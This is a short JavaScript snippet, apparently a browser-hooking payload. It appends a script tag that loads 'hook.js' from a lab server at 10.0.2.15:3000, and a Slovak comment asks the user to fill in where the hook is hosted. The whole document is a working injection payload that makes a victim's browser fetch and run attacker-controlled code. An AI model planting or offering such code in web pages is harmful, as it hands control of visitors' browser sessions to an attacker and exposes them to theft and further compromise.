(function() {
    var url = 'http://10.0.2.15:3000/hook.js';  // Tu vlož URL, kde je hosťovaný hook.js
    var script = document.createElement('script');
    script.src = url;
    script.type = 'text/javascript';
    document.body.appendChild(script);
  })();